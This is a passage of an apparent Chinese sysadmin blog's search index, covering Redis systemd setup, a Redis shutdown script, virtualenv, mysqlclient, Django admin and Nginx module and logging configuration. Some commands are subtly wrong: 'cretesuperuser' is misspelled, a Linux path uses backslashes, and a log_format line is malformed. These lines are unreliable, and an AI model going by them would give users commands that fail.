&#x521B;&#x5EFA;redis.service&#x542F;&#x52A8;&#x6587;&#x4EF6;1[root@ctos7mini ~]&amp; vim /usr/lib/systemd/system/redis.service 123456789101112131415[Unit]Description=Redis persistent key-value databaseAfter=network.target [Service]ExecStart=/usr/local/redis-3.2.5/src/redis-server /usr/local/redis-3.2.5/redis.conf --supervised systemdExecStop=/usr/libexec/redis-shutdownType=notifyUser=redisGroup=redisRuntimeDirectory=redisRuntimeDirectoryMode=0755 [Install]WantedBy=multi-user.target &#x521B;&#x5EFA;redis-shutdown&#x6587;&#x4EF6;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748[root@ctos7mini src]&amp; vim /usr/libexec/redis-shutdown##=========================================================###!/bin/bash## Wrapper to close properly redis and sentineltest x&quot;$REDIS_DEBUG&quot; != x &amp;&amp; set -xREDIS_CLI=/usr/local/redis-3.2.5/src/redis-cli# Retrieve service nameSERVICE_NAME=&quot;$1&quot;if [ -z &quot;$SERVICE_NAME&quot; ]; then SERVICE_NAME=redisfi# Get the proper config file based on service nameCONFIG_FILE=&quot;/etc/$SERVICE_NAME.conf&quot;# Use awk to retrieve host, port from config fileHOST=`awk &apos;/^[[:blank:]]*bind/ { print $2 }&apos; $CONFIG_FILE | tail -n1`PORT=`awk &apos;/^[[:blank:]]*port/ { print $2 }&apos; $CONFIG_FILE | tail -n1`PASS=`awk &apos;/^[[:blank:]]*requirepass/ { print $2 }&apos; $CONFIG_FILE | tail -n1`SOCK=`awk &apos;/^[[:blank:]]*unixsocket\\s/ { print $2 }&apos; $CONFIG_FILE | tail -n1`# Just in case, use default host, portHOST=${HOST:-127.0.0.1}if [ &quot;$SERVICE_NAME&quot; = redis ]; then PORT=${PORT:-6379}else PORT=${PORT:-26739}fi# Setup additional parameters# e.g password-protected redis instances[ -z &quot;$PASS&quot; ] || ADDITIONAL_PARAMS=&quot;-a $PASS&quot;# shutdown the service properlyif [ -e &quot;$SOCK&quot; ] ; then $REDIS_CLI -s $SOCK $ADDITIONAL_PARAMS shutdownelse $REDIS_CLI -h $HOST -p $PORT $ADDITIONAL_PARAMS shutdownfi##=========================================================##[root@ctos7mini src]&amp; chmod 755 /usr/libexec/redis-shutdown 1234567[root@ctos7mini ~]&amp; useradd redis -s /sbin/nologin[root@ctos7mini ~]&amp; systemctl daemon-reload[root@ctos7mini ~]&amp; systemctl start redis[root@ctos7mini ~]&amp; netstat -pantul | grep 6379tcp 0 0 0.0.0.0:6379 0.0.0.0:* LISTEN 1282/redis-server *tcp6 0 0 :::6379 :::* LISTEN 1282/redis-server *[root@ctos7mini ~]&amp; 123456789101112131415161718192021222324252627282930[root@ctos7mini ~]&amp; redis-server &amp;[1] 1282[root@ctos7mini ~]&amp; 1282:C 09 May 04:53:34.532 # Warning: no config file specified, using the default config. In order to specify a config file use redis-server /path/to/redis.conf1282:M 09 May 04:53:34.533 * Increased maximum number of open files to 10032 (it was originally set to 1024). _._ _.-``__ &apos;&apos;-._ _.-`` `. `_. &apos;&apos;-._ Redis 3.2.5 (00000000/0) 64 bit .-`` .-```. ```\\/ _.,_ &apos;&apos;-._ ( &apos; , .-` | `, ) Running in standalone mode |`-._`-...-` __...-.``-._|&apos;` _.-&apos;| Port: 6379 | `-._ `._ / _.-&apos; | PID: 1282 `-._ `-._ `-./ _.-&apos; _.-&apos; |`-._`-._ `-.__.-&apos; _.-&apos;_.-&apos;| | `-._`-._ _.-&apos;_.-&apos; | http://redis.io `-._ `-._`-.__.-&apos;_.-&apos; _.-&apos; |`-._`-._ `-.__.-&apos; _.-&apos;_.-&apos;| | `-._`-._ _.-&apos;_.-&apos; | `-._ `-._`-.__.-&apos;_.-&apos; _.-&apos; `-._ `-.__.-&apos; _.-&apos; `-._ _.-&apos; `-.__.-&apos;1282:M 09 May 04:53:34.540 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.1282:M 09 May 04:53:34.540 # Server started, Redis version 3.2.51282:M 09 May 04:53:34.541 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add &apos;vm.overcommit_memory = 1&apos; to /etc/sysctl.conf and then reboot or run the command &apos;sysctl vm.overcommit_memory=1&apos; for this to take effect.1282:M 09 May 04:53:34.541 # WARNING you have Transparent Huge Pages (THP) support enabled in your kernel. This will create latency and memory usage issues with Redis. To fix this issue run the command &apos;echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled&apos; as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled.1282:M 09 May 04:53:34.541 * DB loaded from disk: 0.000 seconds1282:M 09 May 04:53:34.541 * The server is now ready to accept connections on port 6379[root@ctos7mini ~]&amp; 12[root@ctos7mini ~]&amp; redis-cli127.0.0.1:6379&gt; rpm&#x5B89;&#x88C5;Redis123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657[root@ctos7mini ~]&amp; yum install https://download-ib01.fedoraproject.org/pub/epel/7/x86_64/Packages/r/redis-3.2.12-2.el7.x86_64.rpmLoaded plugins: fastestmirrorredis-3.2.12-2.el7.x86_64.rpm | 544 kB 00:00:01Examining /var/tmp/yum-root-OuFo3f/redis-3.2.12-2.el7.x86_64.rpm: redis-3.2.12-2.el7.x86_64Marking /var/tmp/yum-root-OuFo3f/redis-3.2.12-2.el7.x86_64.rpm to be installedResolving Dependencies--&gt; Running transaction check---&gt; Package redis.x86_64 0:3.2.12-2.el7 will be installed--&gt; Processing Dependency: libjemalloc.so.1()(64bit) for package: redis-3.2.12-2.el7.x86_64Loading mirror speeds from cached hostfile * base: centos.nethub.com.hk * epel: mirrors.neusoft.edu.cn * extras: centos.nethub.com.hk * updates: centos.nethub.com.hk--&gt; Running transaction check---&gt; Package jemalloc.x86_64 0:3.6.0-1.el7 will be installed--&gt; Finished Dependency ResolutionDependencies Resolved============================================================================================================================================================================ Package Arch Version Repository Size============================================================================================================================================================================Installing: redis x86_64 3.2.12-2.el7 /redis-3.2.12-2.el7.x86_64 1.4 MInstalling for dependencies: jemalloc x86_64 3.6.0-1.el7 epel 105 kTransaction Summary============================================================================================================================================================================Install 1 Package (+1 Dependent package)Total size: 1.5 MTotal download size: 105 kInstalled size: 1.7 MIs this ok [y/d/N]: yDownloading packages:jemalloc-3.6.0-1.el7.x86_64.rpm | 105 kB 00:00:00Running transaction checkRunning transaction testTransaction test succeededRunning transaction Installing : jemalloc-3.6.0-1.el7.x86_64 1/2 Installing : redis-3.2.12-2.el7.x86_64 2/2 Verifying : redis-3.2.12-2.el7.x86_64 1/2 Verifying : jemalloc-3.6.0-1.el7.x86_64 2/2Installed: redis.x86_64 0:3.2.12-2.el7Dependency Installed: jemalloc.x86_64 0:3.6.0-1.el7Complete![root@ctos7mini ~]&amp; systemctl start redis[root@ctos7mini ~]&amp; &#x6CE8;&#x610F;&#xFF1A;&#x4F7F;&#x7528;RPM&#x5305;&#x5B89;&#x88C5;redis&#x4F1A;&#x4F9D;&#x8D56;jemalloc&#x7A0B;&#x5E8F;&#x5305;&#xFF0C;jemalloc&#x662F;&#x5185;&#x5B58;&#x5206;&#x914D;&#x5DE5;&#x5177;&#xFF0C;&#x6B64;&#x5305;&#x5728;epel&#x6E90;&#x4E2D; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Python-VirtualEnv","date":"2022-06-07T04:48:42.000Z","path":"/posts/1f351894/","text":"&#x521B;&#x5EFA;&#x865A;&#x62DF;&#x73AF;&#x5883; virtualenv venv_dir &#x6307;&#x5B9A;&#x7248;&#x672C; virtualenv venv_dir --python=python3.7 &#x6FC0;&#x6D3B;&#x865A;&#x62DF;&#x73AF;&#x5883;Windows: venv_dir\\Scripts\\activate Linux: source venv_dir\\bin\\activate &#x9000;&#x51FA;&#x865A;&#x62DF;&#x73AF;&#x5883; deactivate document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"mysqlclient无法安装的问题","date":"2022-06-07T04:48:28.000Z","path":"/posts/3e189d0c/","text":"1234567891011sudo apt install -y mysql-client #&#x57FA;&#x4E8E;python&#x5B89;&#x88C5;mysqlclient&#x9700;&#x8981;&#x4F9D;&#x6B21;&#x5B89;&#x88C5;&#x4EE5;&#x4E0B;&#x5E93;: sudo apt-get install libmysqlclient-dev sudo apt install libssl-dev sudo apt install libcrypto++-dev sudo pip3 install mysqlclient # &#x6700;&#x540E;&#x8FD9;&#x9879;&#x4E5F;&#x53EF;&#x4EE5;&#x5728;&#x865A;&#x62DF;&#x73AF;&#x5883;&#x4E2D;&#x5B89;&#x88C5; pip install mysqlclient document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Django教程","date":"2022-06-07T04:48:14.000Z","path":"/posts/5e357037/","text":"&#x521B;&#x5EFA;&#x7BA1;&#x7406;&#x5458;&#x8D26;&#x6237; 1python manage.py cretesuperuser &#x4FEE;&#x6539;&#x7BA1;&#x7406;&#x5458;&#x8D26;&#x6237;&#x5BC6;&#x7801;1python manage.py changepassword user_name document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Nginx动静分离部署","date":"2022-06-07T04:47:56.000Z","path":"/posts/f4d30967/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Nginx虚拟主机","date":"2022-06-07T04:47:42.000Z","path":"/posts/da411b72/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Nginx添加第三方模块","date":"2022-06-07T04:47:35.000Z","path":"/posts/e0989926/","text":"Nginx&#x6DFB;&#x52A0;&#x7B2C;&#x4E09;&#x65B9;&#x6A21;&#x5757; &#x4EE5;&#x4F1A;&#x8BDD;&#x4FDD;&#x6301;nginx-stiky&#x6A21;&#x5757;&#x4E3A;&#x4F8B; &#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;https://github.com/bymaximus/nginx-sticky-module-ng12345678910111213141516171819202122232425262728293031323334353637383940[root@rhel76 nginx]$ nginx -Vnginx version: nginx/1.12.2built by gcc 4.8.5 20150623 (Red Hat 4.8.5-36) (GCC)built with OpenSSL 1.0.2k-fips 26 Jan 2017TLS SNI support enabledconfigure arguments: --with-http_v2_module --with-http_ssl_module --with-http_sub_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre[root@rhel76 nginx]$[root@rhel76 Packages]$ tar zxf master.tar.gz[root@rhel76 Packages]$ mv nginx-goodies-nginx-sticky-module-ng-08a395c66e42 /usr/local/nginx-stiky-module[root@rhel76 ~]$ ls /usr/local/nginx-stiky-module/basic.t Changelog.txt config docs LICENSE ngx_http_sticky_misc.c ngx_http_sticky_misc.h ngx_http_sticky_module.c patches README.md[root@rhel76 ~]$ cd /usr/local/src/nginx-1.12.2/[root@rhel76 nginx-1.12.2]$ ./configure --prefix=/usr/local/nginx --add-module=/usr/local/nginx-stiky-module/ --with-http_stub_status_module --with-http_sub_module --with-http_ssl_module --with-pcre[root@rhel76 nginx-1.12.2]$ make[root@rhel76 nginx-1.12.2]$ nginx -Vnginx version: nginx/1.12.2built by gcc 4.8.5 20150623 (Red Hat 4.8.5-36) (GCC)built with OpenSSL 1.0.2k-fips 26 Jan 2017TLS SNI support enabledconfigure arguments: --with-http_v2_module --with-http_ssl_module --with-http_sub_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre[root@rhel76 nginx-1.12.2]$ nginx -s stop[root@rhel76 nginx-1.12.2]$ pwd/usr/local/src/nginx-1.12.2[root@rhel76 nginx-1.12.2]$ lsauto CHANGES CHANGES.ru conf configure contrib html LICENSE Makefile man objs README src[root@rhel76 nginx-1.12.2]$ cp ./objs/nginx /usr/local/nginx/sbin/cp: overwrite &#x2018;/usr/local/nginx/sbin/nginx&#x2019;? yes[root@rhel76 nginx-1.12.2]$ nginx[root@rhel76 nginx-1.12.2]$ nginx -Vnginx version: nginx/1.12.2built by gcc 4.8.5 20150623 (Red Hat 4.8.5-36) (GCC)built with OpenSSL 1.0.2k-fips 26 Jan 2017TLS SNI support enabledconfigure arguments: --prefix=/usr/local/nginx --add-module=/usr/local/nginx-stiky-module/ --with-http_stub_status_module --with-http_sub_module --with-http_ssl_module --with-pcre[root@rhel76 nginx-1.12.2]$ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Nginx日志管理","date":"2022-06-07T04:47:28.000Z","path":"/posts/2793eb31/","text":"Nginx&#x65E5;&#x5FD7;&#x7BA1;&#x7406;Nginx&#x65E5;&#x5FD7;&#x4E3B;&#x8981;&#x5206;&#x4E3A;&#x4E24;&#x79CD;&#xFF1A;&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;&#x548C;&#x9519;&#x8BEF;&#x65E5;&#x5FD7; &#x65E5;&#x5FD7;&#x5F00;&#x5173;&#x5728;Nginx&#x914D;&#x7F6E;&#x6587;&#x4EF6;nginx.conf&#x4E2D;&#x8BBE;&#x7F6E;&#xFF0C;&#x4E24;&#x79CD;&#x65E5;&#x5FD7;&#x90FD;&#x53EF;&#x4EE5;&#x9009;&#x62E9;&#x6027;&#x5173;&#x95ED;&#xFF0C;&#x9ED8;&#x8BA4;&#x90FD;&#x662F;&#x6253;&#x5F00;&#x7684;&#x3002; &#x5173;&#x95ED;&#x65E5;&#x5FD7;&#x7684;&#x65B9;&#x5F0F; access_log off; error_log /dev/null; &#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF1A;Nginx&#x8FDB;&#x7A0B;&#x8BBE;&#x7F6E;&#x7684;&#x7528;&#x6237;&#x548C;&#x7528;&#x6237;&#x7EC4;&#x5FC5;&#x987B;&#x5BF9;&#x65E5;&#x5FD7;&#x8DEF;&#x5F84;&#x6709;&#x521B;&#x5EFA;&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x62A5;&#x9519;&#xFF01; &#x8BBF;&#x95EE;&#x65E5;&#x5FD7;access.log&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;&#x4E3B;&#x8981;&#x8BB0;&#x5F55;&#x5BA2;&#x6237;&#x7AEF;&#x8BBF;&#x95EE;Nginx&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#xFF0C;&#x683C;&#x5F0F;&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#x3002;&#x901A;&#x8FC7;&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x7528;&#x6237;&#x5730;&#x57DF;&#x6765;&#x6E90;&#x3001;&#x8DF3;&#x8F6C;&#x6765;&#x6E90;&#x3001;&#x4F7F;&#x7528;&#x7EC8;&#x7AEF;&#x3001;&#x67D0;&#x4E2A;URL&#x8BBF;&#x95EE;&#x91CF;&#x7B49;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x3002; &#x80FD;&#x591F;&#x4F7F;&#x7528;access_log&#x6307;&#x4EE4;&#x7684;&#x5B57;&#x6BB5;&#x5305;&#x62EC;&#xFF1A;http&#x3001;server&#x3001;location &#x89C2;&#x5BDF;nginx&#x7684;http&#x6BB5;,&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5982;&#x4E0B;&#x7C7B;&#x4F3C;&#x4FE1;&#x606F;(&#x65E5;&#x5FD7;&#x4F7F;&#x7528;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#xFF0C;&#x5982;&#x679C;&#x9700;&#x8981;&#x4FEE;&#x6539;&#x65E5;&#x5FD7;&#x914D;&#x7F6E;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x53D6;&#x6D88;&#x6CE8;&#x91CA;) &#x65E5;&#x5FD7;&#x7C7B;&#x578B; &#x65E5;&#x5FD7;&#x8DEF;&#x5F84; &#x65E5;&#x5FD7;&#x683C;&#x5F0F; # access_log logs/access.log main; &#x8FD9;&#x8BF4;&#x660E;&#x8BE5;http&#x7684;&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;&#x7684;&#x6587;&#x4EF6;&#x662F;logs/access.log &#xFF0C;&#x4F7F;&#x7528;&#x7684;&#x683C;&#x5F0F;&#x201D;main&#x201D;&#x683C;&#x5F0F;&#xFF0C;main&#x683C;&#x5F0F;&#x662F;nginx&#x5B9A;&#x4E49;&#x597D;&#x4E00;&#x79CD;&#x65E5;&#x5FD7;&#x7684;&#x683C;&#x5F0F;&#xFF0C;&#x65E5;&#x5FD7;&#x5B9A;&#x4E49;&#x4FE1;&#x606F;&#x5982;&#x4E0B;&#xFF1A; 123#log_format main &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;# &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;# &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;; &#x65E5;&#x5FD7;&#x53D8;&#x91CF;$server_name&#xFF1A;&#x865A;&#x62DF;&#x4E3B;&#x673A;&#x540D;&#x79F0;&#x3002;$remote_addr&#xFF1A;&#x8FDC;&#x7A0B;&#x5BA2;&#x6237;&#x7AEF;IP&#x5730;&#x5740;&#x3002;-&#xFF1A;&#x7A7A;&#x767D;&#xFF0C;&#x7528;&#x4E00;&#x4E2A;&#x201D;-&#x201C;&#x5360;&#x4F4D;&#x7B26;&#x66FF;&#x4EE3;&#xFF0C;&#x5386;&#x53F2;&#x539F;&#x56E0;&#x5BFC;&#x81F4;&#x8FD8;&#x5B58;&#x5728;$remote_user&#xFF1A;&#x8FDC;&#x7A0B;&#x5BA2;&#x6237;&#x7AEF;&#x7528;&#x6237;&#x540D;&#x79F0;&#xFF0C;&#x7528;&#x4E8E;&#x8BB0;&#x5F55;&#x6D4F;&#x89C8;&#x8005;&#x8FDB;&#x884C;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x65F6;&#x63D0;&#x4F9B;&#x7684;&#x540D;&#x5B57;&#xFF0C;&#x5982;&#x767B;&#x5F55;&#x7684;&#x7528;&#x6237;&#x540D;Jaking666&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x767B;&#x5F55;&#x5C31;&#x662F;&#x7A7A;&#x767D;&#x3002;$time_local&#xFF1A;&#x8BBF;&#x95EE;&#x7684;&#x65F6;&#x95F4;&#x4E0E;&#x65F6;&#x533A;&#xFF0C;&#x6BD4;&#x5982;18/Jul/2012:17:00:01 +0800&#x3002;&#x65F6;&#x95F4;&#x4FE1;&#x606F;&#x6700;&#x540E;&#x7684;&#x201D;+0800&#x201D;&#x8868;&#x793A;&#x670D;&#x52A1;&#x5668;&#x6240;&#x5904;&#x65F6;&#x533A;&#x4F4D;&#x4E8E;UTC&#x4E4B;&#x540E;&#x7684;8&#x5C0F;&#x65F6;&#x3002;$request&#xFF1A;&#x8BF7;&#x6C42;&#x7684;URI&#x548C;HTTP&#x534F;&#x8BAE;$status&#xFF1A;&#x8BB0;&#x5F55;&#x8BF7;&#x6C42;&#x8FD4;&#x56DE;&#x7684;http&#x72B6;&#x6001;&#x7801;$body_bytes_sent&#xFF1A;&#x53D1;&#x9001;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x6587;&#x4EF6;&#x4E3B;&#x4F53;&#x5185;&#x5BB9;&#x7684;&#x5927;&#x5C0F;&#xFF08;&#x53EF;&#x4EE5;&#x5C06;&#x65E5;&#x5FD7;&#x6BCF;&#x6761;&#x8BB0;&#x5F55;&#x4E2D;&#x7684;&#x8FD9;&#x4E2A;&#x503C;&#x7D2F;&#x52A0;&#x8D77;&#x6765;&#x4EE5;&#x7C97;&#x7565;&#x4F30;&#x8BA1;&#x670D;&#x52A1;&#x5668;&#x541E;&#x5410;&#x91CF;&#xFF09;$http_referer&#xFF1A;&#x8BB0;&#x5F55;&#x4ECE;&#x54EA;&#x4E2A;&#x9875;&#x9762;&#x94FE;&#x63A5;&#x8BBF;&#x95EE;&#x8FC7;&#x6765;&#x7684;&#x3002;$http_user_agent&#xFF1A;&#x5BA2;&#x6237;&#x7AEF;&#x6D4F;&#x89C8;&#x5668;&#x4FE1;&#x606F;$http_x_forwarded_for&#xFF1A;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x771F;&#x5B9E;IP&#xFF08;&#x901A;&#x5E38;web&#x670D;&#x52A1;&#x5668;&#x653E;&#x5728;&#x53CD;&#x5411;&#x4EE3;&#x7406;&#x7684;&#x540E;&#x9762;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x4E0D;&#x80FD;&#x83B7;&#x53D6;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#x7684;IP&#x5730;&#x5740;&#x4E86;&#xFF0C;&#x901A;&#x8FC7;$request_addr&#x62FF;&#x5230;&#x7684;IP&#x5730;&#x5740;&#x662F;&#x53CD;&#x5411;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x7684;IP&#x5730;&#x5740;&#x3002;&#x53CD;&#x5411;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x5728;&#x8F6C;&#x53D1;&#x8BF7;&#x6C42;&#x7684;http&#x5934;&#x4FE1;&#x606F;&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x589E;&#x52A0;x_forward_for&#x4FE1;&#x606F;&#xFF0C;&#x7528;&#x4EE5;&#x8BB0;&#x5F55;&#x539F;&#x6709;&#x5BA2;&#x6237;&#x7AEF;&#x7684;IP&#x5730;&#x5740;&#x548C;&#x539F;&#x6765;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x8BF7;&#x6C42;&#x7684;&#x670D;&#x52A1;&#x5668;&#x5730;&#x5740;&#xFF09;uptream_statusupstream&#x72B6;&#x6001;upstream_addr&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x7684;IP&#x5730;&#x5740;ssl_protocolSSL&#x534F;&#x8BAE;&#x7248;&#x672C;&#xFF0C;&#x6BD4;&#x5982;TLSv1&#x3002;ssl_cipher&#x4EA4;&#x6362;&#x6570;&#x636E;&#x4E2D;&#x7684;&#x7B97;&#x6CD5;&#xFF0C;&#x6BD4;&#x5982;RC4-SHA&#x3002;upstream_addrupstream&#x7684;&#x5730;&#x5740;&#xFF0C;&#x5373;&#x771F;&#x6B63;&#x63D0;&#x4F9B;&#x670D;&#x52A1;&#x7684;&#x4E3B;&#x673A;&#x5730;&#x5740;&#x3002;request_time&#x6574;&#x4E2A;&#x8BF7;&#x6C42;&#x7684;&#x603B;&#x65F6;&#x95F4;&#x3002;upstream_response_time&#x8BF7;&#x6C42;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;upstream&#x7684;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x3002; &#x6253;&#x5F00;nginx.conf&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF1A; vim /usr/local/nginx/nginx.conf&#x65E5;&#x5FD7;&#x90E8;&#x5206;&#x5185;&#x5BB9;&#xFF1A; # access_log logs/access.log main; &#x65E5;&#x5FD7;&#x751F;&#x6210;&#x7684;&#x5230;Nginx&#x6839;&#x76EE;&#x5F55;&#x54E6;logs/access.log&#x6587;&#x4EF6;&#xFF0C;&#x9ED8;&#x8BA4;&#x4F7F;&#x7528;&#x201D;main&#x201D;&#x65E5;&#x5FD7;&#x683C;&#x5F0F;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#x683C;&#x5F0F;&#x3002; &#x9664;&#x4E86;main&#x683C;&#x5F0F;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#x5176;&#x4ED6;&#x683C;&#x5F0F;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#xFF1A;log_format name(&#x683C;&#x5F0F;&#x540D;&#x79F0;) type(&#x683C;&#x5F0F;&#x6837;&#x5F0F;) &#x4F8B;&#x5982;&#xFF1A;12345#log format main &apos;remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;# &apos;$status $body_bytes_sent &quot;$http_referer&quot;&apos;# &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;# access_log logs/access.log main; &#x67E5;&#x770B;NGINX&#x65E5;&#x5FD7;&#xFF1A;12345678910111213[root@rhel76 ~]&amp; tail -f /usr/local/nginx/logs/access.log&apos;192.168.73.20 - - [03/Jun/2022:06:09:06 +0800] &quot;HEAD / HTTP/1.1&quot; 200 0 &quot;-&quot; &quot;curl/7.29.0&quot;192.168.73.20 - - [03/Jun/2022:06:09:18 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;curl/7.29.0&quot;192.168.73.20 - - [03/Jun/2022:06:09:30 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;curl/7.29.0&quot;192.168.73.1 - - [03/Jun/2022:06:27:17 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36&quot;192.168.73.1 - - [03/Jun/2022:06:27:17 +0800] &quot;GET /favicon.ico HTTP/1.1&quot; 404 571 &quot;http://192.168.73.24/&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36&quot;192.168.73.1 - - [03/Jun/2022:06:28:17 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36&quot;192.168.73.1 - - [03/Jun/2022:06:28:17 +0800] &quot;GET /favicon.ico HTTP/1.1&quot; 404 571 &quot;http://192.168.73.24/&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36&quot;192.168.73.1 - - [03/Jun/2022:06:33:36 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.30&quot;192.168.73.1 - - [03/Jun/2022:06:33:37 +0800] &quot;GET /favicon.ico HTTP/1.1&quot; 404 571 &quot;http://192.168.73.24/&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.30&quot;&apos; Nginx&#x81EA;&#x5B9A;&#x4E49;&#x65E5;&#x5FD7;1[root@rhel76 ~]&amp; vim /usr/local/nginx/conf/nginx.conf 123456789101112131415161718192021222324252627282930313233http { include mime.types; default_type application/octet-stream; # &#x542F;&#x7528;&#x65E5;&#x5FD7;&#x683C;&#x5F0F;&#x5316; log_format main &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos; &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos; &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;; # &#x4E0D;&#x4F7F;&#x7528;&#x9ED8;&#x8BA4;&#x65E5;&#x5FD7;&#x6587;&#x4EF6; #########access_log logs/access.log main; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; #gzip on; server { listen 80; server_name localhost; # &#x542F;&#x7528;&#x81EA;&#x5B9A;&#x4E49;&#x65E5;&#x5FD7;&#x6587;&#x4EF6; access_log logs/host.access.log main; location / { root html; index index.html index.htm; }# 